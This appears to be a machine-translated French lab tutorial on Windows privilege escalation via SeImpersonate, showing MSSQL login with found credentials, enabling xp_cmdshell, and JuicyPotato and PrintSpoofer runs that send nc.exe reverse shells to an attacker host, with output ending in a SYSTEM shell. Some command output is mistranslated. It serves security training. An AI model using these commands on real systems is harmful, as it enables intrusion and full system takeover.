SeImpersonate et SeAssignPrimaryToken
======================================

* * * * *

Dans Windows, chaque processus possède un jeton contenant des informations sur le compte qui l'exécute. Ces jetons ne sont pas considérés comme des ressources sécurisées, car ce ne sont que des emplacements dans la mémoire qui pourraient être forcés brutalement par des utilisateurs qui ne peuvent pas lire la mémoire. Pour utiliser le jeton, le privilège `SeImpersonate` est nécessaire. Il n'est attribué qu'aux comptes administratifs et, dans la plupart des cas, peut être supprimé lors du renforcement du système. Un exemple d'utilisation de ce jeton serait [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw).

Les programmes légitimes peuvent utiliser le jeton d'un autre processus pour passer de l'administrateur au système local, qui dispose de privilèges supplémentaires. Les processus le font généralement en appelant le processus WinLogon pour obtenir un jeton SYSTEM, puis en s'exécutant avec ce jeton en le plaçant dans l'espace SYSTEM. Les attaquants abusent souvent de ce privilège dans les privilèges de type "Potato", où un compte de service peut `SeImpersonate`, mais n'obtient pas tous les privilèges de niveau SYSTEM. Essentiellement, l'attaque Potato trompe un processus exécuté en tant que SYSTEM pour se connecter à son processus, qui transmet le jeton à utiliser.

Nous rencontrerons souvent ce privilège après avoir obtenu l'exécution de code à distance via une application qui s'exécute dans le contexte d'un compte de service (par exemple, le téléchargement d'un shell Web sur une application Web ASP.NET, l'exécution de code à distance via une installation Jenkins, ou en exécutant des commandes via des requêtes MSSQL). Chaque fois que nous accédons de cette manière, nous devons immédiatement vérifier ce privilège car sa présence offre souvent une voie rapide et facile vers des privilèges élevés. Cet [article](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) vaut la peine d'être lu pour plus de détails sur les attaques par usurpation d'identité.

* * * * *

Exemple SeImpersonate - JuicyPotato
-----------------------------------

Prenons l'exemple ci-dessous, où nous avons pris pied sur un serveur SQL en utilisant un utilisateur SQL privilégié. Les connexions client à IIS et SQL Server peuvent être configurées pour utiliser l'authentification Windows. Le serveur peut alors avoir besoin d'accéder à d'autres ressources telles que des partages de fichiers en tant que client de connexion. Cela peut être fait en usurpant l'identité de l'utilisateur dont le contexte dans lequel la connexion client est établie. Pour ce faire, le compte de service se verra accorder l'[Usurpation de l'identité d'un client après authentification](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a -privilège client-après-authentification).

Dans ce scénario, le compte de service SQL Service s'exécute dans le contexte du compte `mssqlserver` par défaut. Imaginez que nous ayons réussi à exécuter une commande en tant qu'utilisateur en utilisant `xp_cmdshell` à l'aide d'un ensemble d'informations d'identification obtenues dans un fichier `logins.sql` sur un partage de fichiers à l'aide de l'outil `Snaffler` .

#### Connexion avec MSSQLClient.py

À l'aide des identifiants `sql_dev:Str0ng_P@ssw0rd!`, commençons par nous connecter à l'instance du serveur SQL et confirmons nos privilèges. Nous pouvons le faire en utilisant [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) de la boîte à outils `Impacket` .

Connexion avec MSSQLClient.py

```
dsgsec@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Mot de passe:
[*] Cryptage requis, passage à TLS
[*] ENVCHANGE(DATABASE) : ancienne valeur : maître, nouvelle valeur : maître
[*] ENVCHANGE(LANGUAGE) : ancienne valeur : aucune, nouvelle valeur : us_english
[*] ENVCHANGE(TAILLE DE PAQUET) : ancienne valeur : 4096, nouvelle valeur : 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01) : Ligne 1 : contexte de base de données modifié en « maître ».
[*] INFO(WINLPE-SRV01\SQLEXPRESS01) : Ligne 1 : paramètre de langue modifié en us_english.
[*] ACK : Résultat : 1 - Microsoft SQL Server (130 19162)
[!] Appuyez sur help pour des commandes shell supplémentaires
SQL>

```

#### Activation de xp_cmdshell

Ensuite, nous devons activer la procédure stockée `xp_cmdshell` pour exécuter les commandes du système d'exploitation. Nous pouvons le faire via le shell Impacket MSSSQL en tapant `enable_xp_cmdshell`. Taper `help` affiche quelques autres options de commande.

Activation de xp_cmdshell

```
SQL> enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01) : ligne 185 : l'option de configuration "afficher les options avancées" est passée de 0 à 1. Exécutez l'instruction RECONFIGURE pour l'installation.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01) : ligne 185 : l'option de configuration 'xp_cmdshell' est passée de 0 à 1. Exécutez l'instruction RECONFIGURE pour installer

```

Remarque : Nous n'avons pas besoin de taper `RECONFIGURE` car Impacket le fait pour nous.

#### Confirmation de l'accès

Avec cet accès, nous pouvons confirmer que nous fonctionnons bien dans le contexte d'un compte de service SQL Server.

Confirmation de l'accès

```
SQL> xp_cmdshell whoami

sortir

-------------------------------------------------- ------------------------------

service nt\mssql$sqlexpress01

```

#### Vérification des privilèges du compte

Ensuite, vérifions quels privilèges le service-compte a été accordé.

Vérification des privilèges du compte

```
SQL> xp_cmdshell whoami /priv

sortir

-------------------------------------------------- ------------------------------

INFORMATIONS SUR LES PRIVILÈGES

----------------------
Nom du privilège Description État

================================================= ==================== ========

SeAssignPrimaryTokenPrivilege Remplacer un jeton de niveau processus Désactivé
SeIncreaseQuotaPrivilege Ajuster les quotas de mémoire pour un processus Désactivé
SeChangeNotifyPrivilege Bypass traverse la vérification activée
SeManageVolumePrivilege Effectuer des tâches de maintenance de volume Activé
SeImpersonatePrivilege Emprunter l'identité d'un client après l'authentification Activé
SeCreateGlobalPrivilege Créer des objets globaux Activé
SeIncreaseWorkingSetPrivilege Augmenter un ensemble de travail de processus Désactivé

```

La commande `whoami /priv` confirme que [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) est répertorié. Ce privilège peut être utilisé pour usurper l'identité d'un compte privilégié tel que `NT AUTHORITY\SYSTEM`. [JuicyPotato](https://github.com/ohpe/juicy-potato) peut être utilisé pour exploiter les privilèges `SeImpersonate` ou `SeAssignPrimaryToken` via l'abus de réflexion DCOM/NTLM.

#### Augmentation des privilèges à l'aide de JuicyPotato

Pour augmenter les privilèges à l'aide de ces droits, commençons par télécharger le binaire `JuicyPotato.exe` et téléchargeons-le ainsi que `nc.exe` sur le serveur cible. Ensuite, placez un écouteur Netcat sur le port 8443 et exécutez la commande ci-dessous où `-l` est le port d'écoute du serveur COM, `-p` est le programme à lancer (cmd.exe), `-a` est l'argument transmis à cmd.exe, et `-t` est l'appel `createprocess` . Ci-dessous, nous disons à l'outil d'essayer à la fois  [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) et [CreateProcessAsUser](https : //docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) fonctions, qui nécessitent respectivement les privilèges `SeImpersonate` ou `SeAssignPrimaryToken` .

Augmentation des privilèges à l'aide de JuicyPotato

```
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

sortir

-------------------------------------------------- ------------------------------

Test {4991d34b-80a1-4291-83b6-3328366b9097} 53375

[+] résultat d'authentification 0
{4991d34b-80a1-4291-83b6-3328366b9097} ;AUTORITÉ NT\SYSTÈME
[+] CreateProcessWithTokenW OK
[+] appelant 0x000000000088ce08

```

#### Attraper SYSTEM Shell

Cela se termine avec succès et un shell en tant que `NT AUTHORITY\SYSTEM` est reçu.

Attraper SYSTEM Shell

```
dsgsec@htb[/htb]$ sudo nc -lnvp 8443

écoute sur [tout] 8443 ...
se connecter à [10.10.14.3] depuis (INCONNU) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]
(c) Microsoft Corporation 2016. Tous les droits sont réservés.

C:\Windows\system32>whoami

qui suis je
autorité nt\système

C:\Windows\system32>nom d'hôte

nom d'hôte
WINLPE-SRV01

```

* * * * *

PrintSpoofer et RoguePotato
-------------------------------------

JuicyPotato ne fonctionne pas sur Windows Server 2019 et Windows 10 build 1809 et ultérieur. Cependant, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) et [RoguePotato](https://github.com/antonioCoco/RoguePotato) peuvent être utilisés pour tirer parti des mêmes privilèges et obtenir `NT AUTHORITY\SYSTEM ` niveau d'accès. Cet [article de blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) va en profondeur sur l'outil `PrintSpoofer` , qui peut être utilisé pour abuser des privilèges d'emprunt d'identité sur Windows 10 et Server 2019 hébergeurs où JuicyPotato ne fonctionne plus.

#### Augmentation des privilèges à l'aide de PrintSpoofer

Essayons cela à l'aide de l'outil `PrintSpoofer`. Nous pouvons utiliser l'outil pour générer un processus SYSTEM dans votre console actuelle et interagir avec lui, générer un processus SYSTEM sur un bureau (si connecté localement ou via RDP), ou attraper un reverse shell - ce que nous ferons dans notre exemple. Encore une fois, connectez-vous avec `mssqlclient.py` et utilisez l'outil avec l'argument `-c` pour exécuter une commande. Ici, en utilisant `nc.exe` pour générer un shell inversé (avec un écouteur Netcat en attente sur notre boîte d'attaque sur le port 8443).

Escalade des privilèges à l'aide de PrintSpoofer

```
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

sortir

-------------------------------------------------- ------------------------------

[+] Privilège trouvé : SeImpersonatePrivilege

[+] Pipe nommée à l'écoute...

[+] CréerProcessAsUser() OK

NUL

```

#### Attraper Reverse Shell en tant que SYSTEM

Si tout se passe comme prévu, nous aurons un shell SYSTEM sur notre écouteur netcat.

Attraper Reverse Shell en tant que SYSTEM

```
dsgsec@htb[/htb]$ nc -lnvp 8443

écoute sur [tout] 8443 ...
se connecter à [10.10.14.3] depuis (INCONNU) [10.129.43.30] 49847
Microsoft Windows [Version10.0.14393]
(c) Microsoft Corporation 2016. Tous les droits sont réservés.

C:\Windows\system32>whoami

qui suis je
autorité nt\système

```

L'augmentation des privilèges en utilisant `SeImpersonate` est très courante. Il est essentiel de se familiariser avec les différentes méthodes qui s'offrent à nous en fonction de la version et du niveau de l'OS de l'hôte cible.